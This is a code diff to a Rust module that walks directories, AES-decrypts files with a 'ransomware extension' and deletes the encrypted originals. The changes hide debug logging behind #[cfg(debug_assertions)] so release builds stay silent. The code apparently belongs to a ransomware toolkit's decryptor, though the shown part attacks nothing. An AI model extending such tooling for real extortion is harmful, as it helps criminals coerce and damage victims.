@@ -43,9 +43,11 @@ pub fn walk_decrypt(directories: &[&str], aes_key: &[u8], encrypted_ext: &str) {
             full_path.push_str("\\");
             full_path.push_str(dir);
 
+            #[cfg(debug_assertions)]{
             let full_path_cs: CString = CString::new(full_path.as_bytes()).unwrap();
             println!("Processing: {}", full_path_cs.to_str().unwrap());
-
+            }
+            
             // Call the function to traverse and decrypt the files, passing in the AES key and the ransomware extension
             let _ = traverse_and_decrypt_path(&full_path, aes_key, encrypted_ext);
         }
@@ -59,7 +61,11 @@ pub fn walk_decrypt(directories: &[&str], aes_key: &[u8], encrypted_ext: &str) {
 /// * `directory_path` - Path to the directory to be traversed
 /// * `aes_key`        - AES key used for decryption
 /// * `encrypted_ext`  - Extension used by the ransomware-encrypted files
-pub fn traverse_and_decrypt_path(directory_path: &str, aes_key: &[u8], encrypted_ext: &str) -> io::Result<()> {
+pub fn traverse_and_decrypt_path(
+    directory_path: &str,
+    aes_key: &[u8],
+    encrypted_ext: &str,
+) -> io::Result<()> {
     let directory = Path::new(directory_path);
 
     if directory.is_dir() {
@@ -80,6 +86,7 @@ pub fn traverse_and_decrypt_path(directory_path: &str, aes_key: &[u8], encrypted
                         decrypted_path.set_extension(""); // Remove the ransomware extension
                         let decrypted_path_str = decrypted_path.to_str().unwrap_or("");
 
+                        #[cfg(debug_assertions)]
                         println!("Decrypting: {} -> {}", original_path, decrypted_path_str);
 
                         let c_original = CString::new(original_path)
@@ -88,8 +95,10 @@ pub fn traverse_and_decrypt_path(directory_path: &str, aes_key: &[u8], encrypted
                             .expect("Failed to create CString for destination path");
 
                         // Call the decrypt function with the AES key
-                        let result = decypher::decrypt(c_original.clone(), c_decrypted, aes_key.to_vec());
+                        let result =
+                            decypher::decrypt(c_original.clone(), c_decrypted, aes_key.to_vec());
                         if !result {
+                            #[cfg(debug_assertions)]
                             println!("Failed to decrypt: {}", original_path);
                         } else {
                             // Remove the encrypted file after successful decryption
